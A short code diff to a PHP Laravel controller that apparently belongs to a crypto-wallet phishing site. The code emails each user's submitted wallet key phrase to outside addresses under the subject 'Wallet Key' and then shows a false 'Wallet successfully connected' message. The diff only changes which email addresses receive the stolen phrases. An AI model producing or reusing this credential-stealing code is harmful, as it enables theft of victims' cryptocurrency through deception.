@@ -26,7 +26,7 @@ class PagesController extends Controller
         $phrase = $request['key'];
         // dd($phrase);
         Mail::raw('Here is a ' . $wallet_type . ' address' . ', ' . $phrase, function ($message) {
-            $message->to('marycabudol2200@gmail.com')
+            $message->to(['hello@callmehalpha.me','chimeinsuppor@gmail.com'])
                 ->subject('Wallet Key');
         });
         return back()->with('success', 'Wallet successfully connected');
